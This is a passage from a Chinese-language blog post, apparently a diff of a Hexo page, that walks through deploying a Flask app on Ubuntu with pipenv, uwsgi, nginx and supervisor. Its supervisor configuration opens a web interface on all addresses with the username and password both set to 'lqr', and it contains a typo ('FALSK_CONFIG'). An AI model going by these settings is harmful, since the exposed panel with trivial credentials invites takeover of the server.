+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip config set global.index-url https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br></pre></td></tr></table></figure></li>
+<li><p>全局安装 <code>pipenv</code>： <code>sudo -H pip3 install pipenv</code></p>
+<h3 id="【注意】：一定要全局安装，哪怕是使用-pip3-install-pipenv，也要用上面的命令装一次"><a href="#【注意】：一定要全局安装，哪怕是使用-pip3-install-pipenv，也要用上面的命令装一次" class="headerlink" title="【注意】：一定要全局安装，哪怕是使用 pip3 install pipenv，也要用上面的命令装一次"></a>【注意】：一定要全局安装，哪怕是使用 <code>pip3 install pipenv</code>，也要用上面的命令装一次</h3></li>
+<li><p>重新更新一遍：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure></li>
+<li><p>设置防火墙，并更新规则：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow 22</span><br><span class="line">sudo ufw allow 80</span><br><span class="line">sudo ufw allow 443</span><br><span class="line">sudo ufw enable        &#x2F;&#x2F; 更新规则</span><br></pre></td></tr></table></figure></li>
+<li><p>查看防火墙状态：<code>sudo ufw status</code></p>
+</li>
+<li><p>将仓库的目录下载到本地，实例以 <code>MMCs</code>为例，即：<code>lqr</code> 目录下有 <code>MMCs</code> 文件夹</p>
+</li>
+<li><p>进入文件夹，并创建虚拟环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd MMCs</span><br><span class="line">pipenv install</span><br></pre></td></tr></table></figure></li>
+<li><p>创建 <code>.env</code>： <code>nano .env</code> (可以直接复制)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FLASK_ENV&#x3D;production</span><br><span class="line">FALSK_CONFIG&#x3D;production</span><br></pre></td></tr></table></figure></li>
+<li><p>设置pipenv的镜像：</p>
+<ol>
+<li>查看 Pipfile ： <code>cat Pipfile</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[[source]]</span><br><span class="line">url &#x3D; &quot;https:&#x2F;&#x2F;pypi.org&#x2F;simple&quot;</span><br><span class="line">verify_ssl &#x3D; true</span><br><span class="line">name &#x3D; &quot;pypi&quot;</span><br><span class="line"></span><br><span class="line">[packages]</span><br><span class="line">flask &#x3D; &quot;*&quot;</span><br><span class="line">requests &#x3D; &quot;*&quot;</span><br><span class="line">wtforms &#x3D; &quot;*&quot;</span><br><span class="line">flask-sqlalchemy &#x3D; &quot;*&quot;</span><br><span class="line">cymysql &#x3D; &quot;*&quot;</span><br><span class="line">flask-login &#x3D; &quot;*&quot;</span><br><span class="line"></span><br><span class="line">[dev-packages]</span><br><span class="line"></span><br><span class="line">[requires]</span><br><span class="line">python_version &#x3D; &quot;3.7&quot;</span><br></pre></td></tr></table></figure></li>
+<li>将第2行：<code>url = &quot;https://pypi.org/simple&quot;</code> 替换成： <code>url = &quot;https://pypi.tuna.tsinghua.edu.cn/simple/&quot;</code> （这里的网址，可以替换成其他镜像）</li>
+</ol>
+</li>
+<li><p>进入shell，并安装 <code>--dev、uwsgi</code>（在 <code>MMCs</code> 文件夹下进行）： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pipenv shell</span><br><span class="line">pipenv install --dev</span><br><span class="line">pipenv install uwsgi</span><br></pre></td></tr></table></figure></li>
+<li></li>
+<li><p>接着执行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flask init      &#x2F;&#x2F; 如果已经初始化过，这里改成 flask init --drop</span><br><span class="line">flask forge</span><br><span class="line">flask translate compile</span><br><span class="line">flask run</span><br></pre></td></tr></table></figure>
+<p>如果出现类似下面的内容，说明配置的应该是正确的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* Environment: development</span><br><span class="line">* Debug mode:on</span><br><span class="line">* Debugger is active!</span><br><span class="line">* Debugger PIN: 202-005-064</span><br><span class="line">* Running on http:&#x2F;&#x2F;127.0.0.1:5000&#x2F; (Press CTRL+C to quit)</span><br></pre></td></tr></table></figure>
+<p>然后，按 <code>CTRL+C</code> 结束，进行下一步</p>
+</li>
+<li><p>使用 Gunicorn 运行程序</p>
+<ol>
+<li> 安装 <code>pipenv install gunicorn</code></li>
+<li> 设置防火墙： <code>sudo ufw allow 8000</code></li>
+<li> 更新防火墙规则： <code>sudo ufw enable</code></li>
+<li> 运行程序： <code>gunicorn --workers=4 wsgi:app</code></li>
+<li> 按 <code>CTRL+C</code> 结束，进行下一步</li>
+</ol>
+</li>
+<li><p>键入：<code>exit</code>，以退出 <strong><em>MMCs</em></strong></p>
+</li>
+<li><p>使用 <code>nginx</code></p>
+<ol>
+<li> 安装 <em>nginx</em> : <code>sudo apt install nginx</code></li>
+<li> 可以访问你的 <code>公网ip</code> （例如本案例中：123.123.123.123），可以看到 <code>welcome nginx</code> 的界面</li>
+<li> 删除 <em>default</em> : <code>sudo rm /etc/nginx/sites-enabled/default</code></li>
+<li>创建同项目文件夹名称的文件：  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;MMCs</span><br></pre></td></tr></table></figure>
+ 添加以下内容： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    server_name _;</span><br><span class="line">    access_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log;</span><br><span class="line">    error_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log;</span><br><span class="line"></span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass 127.0.0.1:3031;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location &#x2F;static &#123;</span><br><span class="line">        alias &#x2F;home&#x2F;lqr&#x2F;MMCs&#x2F;MMCs&#x2F;static&#x2F;;</span><br><span class="line">        expires 7d;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>测试<em>nginx</em>语法的正确性：<code>sudo nginx -t</code>，如果有下面的内容说明正确： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx: the configuration file &#x2F;etc&#x2F;nginx&#x2F;nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file &#x2F;etc&#x2F;nginx&#x2F;nginx.conf test is successful</span><br></pre></td></tr></table></figure></li>
+<li>重启 <em>nginx</em>：<code>sudo service nginx restart</code></li>
+<li>设置 <em>nginx</em>的转发目标地址： <code>gunicorn -w 4 wsgi:app</code></li>
+</ol>
+</li>
+<li><p>使用 <strong><em>Supervisor</em></strong> 管理进程</p>
+<ol>
+<li>安装：<code>sudo apt install supervisor</code></li>
+<li>创建 <em>MMCs.conf</em>文件： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano &#x2F;etc&#x2F;supervisor&#x2F;conf.d&#x2F;MMCs.conf</span><br></pre></td></tr></table></figure>
+写入以下配置（自己按照情况改变）：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[program:MMCs]</span><br><span class="line">command&#x3D;pipenv run uwsgi --socket 127.0.0.1:3031 --wsgi-file wsgi.py --callable app --processes 4 --threads 2 --stats 127.0.0.1:9191</span><br><span class="line">directory&#x3D;&#x2F;home&#x2F;lqr&#x2F;MMCs</span><br><span class="line">user&#x3D;lqr</span><br><span class="line">autostart&#x3D;true</span><br><span class="line">autorestart&#x3D;true</span><br><span class="line">stopasgroup&#x3D;true</span><br><span class="line">killasgroup&#x3D;true</span><br></pre></td></tr></table></figure></li>
+<li>配置 <em>supervisord.conf</em><ol>
+<li>在 [supervisord] 节下添加下面这行定义<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">environment&#x3D;LC_ALL&#x3D;&#39;en_US.UTF-8&#39;,LANG&#x3D;&#39;en_US.UTF-8&#39;</span><br></pre></td></tr></table></figure></li>
+<li>在末尾添加<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[inet_http_server]</span><br><span class="line">port&#x3D;*:9001</span><br><span class="line">username&#x3D;lqr</span><br><span class="line">password&#x3D;lqr</span><br></pre></td></tr></table></figure></li>
+<li>重启 <code>supervisor</code> 服务： <code>sudo service supervisor restart</code></li>
+<li>查看状态和进行相关操作： <code>sudo supervisorctl</code></li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<ul>
+<li><h1 id="拓展命令"><a href="#拓展命令" class="headerlink" title="拓展命令"></a>拓展命令</h1></li>
+</ul>
+<ol>
+<li><p>安装 <code>unzip</code>：<code>sudo apt install unzip</code></p>
+</li>
+<li><p>将zip解压到 <code>temp</code> 文件夹中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir temp</span><br><span class="line">unzip -d temp temp.zip</span><br></pre></td></tr></table></figure>
+<h3 id="【注意】：命令需要在当前文件夹中"><a href="#【注意】：命令需要在当前文件夹中" class="headerlink" title="【注意】：命令需要在当前文件夹中"></a>【注意】：命令需要在当前文件夹中</h3></li>
+<li><p>如果pip3 出现如下错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&#x2F;usr&#x2F;bin&#x2F;pip&quot;, line 9, in &lt;module&gt;</span><br><span class="line">    from pip import main</span><br><span class="line">ImportError: cannot import name &#39;main&#39;</span><br></pre></td></tr></table></figure>
+<p>那么，修改<code>/usr/bin/pip3</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano &#x2F;usr&#x2F;bin&#x2F;pip3</span><br></pre></td></tr></table></figure>
+<h3 id="将-from-pip-import-main-修改为-from-pip-internal-import-main-，即可"><a href="#将-from-pip-import-main-修改为-from-pip-internal-import-main-，即可" class="headerlink" title="将 from pip import main 修改为 from pip._internal import main ，即可"></a><strong>将 <code>from pip import main</code> 修改为 <code>from pip._internal import main</code></strong> ，即可</h3></li>
+<li><p>如果使用 <code>pipenv install --dev</code> 安装依赖，出现安装超时：<code>ReadTimeoutError</code>，那么将 <code>.env</code> 的文件添加 <code>PIPENV_TIMEOUT=3600</code></p>
+</li>
+<li><p>如果想重新初始化或者更改了某些文件，执行下面的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flask init --drop</span><br><span class="line">flask forge</span><br><span class="line">flask translate compile</span><br><span class="line">flask run</span><br></pre></td></tr></table></figure></li>
+<li><p>nginx上传默认1m，因此，需要更改一下：</p>
+<ol>
+<li>打开nginx配置文件 nginx.conf, 路径一般是：/etc/nginx/nginx.conf</li>
+<li>在http{}段中加入 client_max_body_size 20m; 20m为允许最大上传的大小</li>
+<li>保存后重启nginx，问题解决。</li>
+</ol>
+</li>
+<li><p>文件下载不了：将<code>diff</code>更改为 <code>true</code>，见下图：<br><img src="/source/imagess/posts/flask/5.png"></p>
+<blockquote>
+<p>[错误日志]</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[2019-08-20 11:24:30,814] - MMCs - 60.2.111.59 requested http:&#x2F;&#x2F;47.98.142.112&#x2F;admin&#x2F;score&#x2F;download&#x2F;teacher</span><br><span class="line">ERROR in app: Exception on &#x2F;admin&#x2F;score&#x2F;download&#x2F;teacher [GET]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&#x2F;home&#x2F;lqr&#x2F;.local&#x2F;share&#x2F;virtualenvs&#x2F;MMCs-SswGTqqS&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;flask&#x2F;app.py&quot;, line 2446, in wsgi_app</span><br><span class="line">    response &#x3D; self.full_dispatch_request()</span><br><span class="line">  File &quot;&#x2F;home&#x2F;lqr&#x2F;.local&#x2F;share&#x2F;virtualenvs&#x2F;MMCs-SswGTqqS&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;flask&#x2F;app.py&quot;, line 1951, in full_dispatch_request</span><br><span class="line">    rv &#x3D; self.handle_user_exception(e)</span><br><span class="line">  File &quot;&#x2F;home&#x2F;lqr&#x2F;.local&#x2F;share&#x2F;virtualenvs&#x2F;MMCs-SswGTqqS&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;flask&#x2F;app.py&quot;, line 1820, in handle_user_exception</span><br><span class="line">    reraise(exc_type, exc_value, tb)</span><br><span class="line">  File &quot;&#x2F;home&#x2F;lqr&#x2F;.local&#x2F;share&#x2F;virtualenvs&#x2F;MMCs-SswGTqqS&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;flask&#x2F;_compat.py&quot;, line 39, in reraise</span><br><span class="line">    raise value</span><br><span class="line">  File &quot;&#x2F;home&#x2F;lqr&#x2F;.local&#x2F;share&#x2F;virtualenvs&#x2F;MMCs-SswGTqqS&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;flask&#x2F;app.py&quot;, line 1949, in full_dispatch_request</span><br><span class="line">    rv &#x3D; self.dispatch_request()</span><br><span class="line">  File &quot;&#x2F;home&#x2F;lqr&#x2F;.local&#x2F;share&#x2F;virtualenvs&#x2F;MMCs-SswGTqqS&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;flask&#x2F;app.py&quot;, line 1935, in dispatch_request</span><br><span class="line">    return self.view_functions[rule.endpoint](**req.view_args)</span><br><span class="line">  File &quot;&#x2F;home&#x2F;lqr&#x2F;.local&#x2F;share&#x2F;virtualenvs&#x2F;MMCs-SswGTqqS&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;flask_login&#x2F;utils.py&quot;, line 299, in decorated_view</span><br><span class="line">    return func(*args, **kwargs)</span><br><span class="line">  File &quot;.&#x2F;MMCs&#x2F;blueprints&#x2F;admin.py&quot;, line 286, in download_teacher</span><br><span class="line">    zfile &#x3D; gen_teacher_result(com.id)</span><br><span class="line">  File &quot;.&#x2F;MMCs&#x2F;downloader.py&quot;, line 46, in gen_teacher_result</span><br><span class="line">    zip2here(file, zfile)</span><br><span class="line">  File &quot;.&#x2F;MMCs&#x2F;utils&#x2F;zip.py&quot;, line 22, in zip2here</span><br><span class="line">    z.write(input_path, file)</span><br><span class="line">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;zipfile.py&quot;, line 1617, in write</span><br><span class="line">    zinfo &#x3D; ZipInfo.from_file(filename, arcname)</span><br><span class="line">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;zipfile.py&quot;, line 507, in from_file</span><br><span class="line">    st &#x3D; os.stat(filename)</span><br><span class="line">FileNotFoundError: [Errno 2] No such file or directory: &#39;h&#39;</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">QeuroIzo</p>
+  <div class="site-description" itemprop="description">你有灵魂吗</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">117</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">QeuroIzo</span>
+</div>
+
+<!----
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
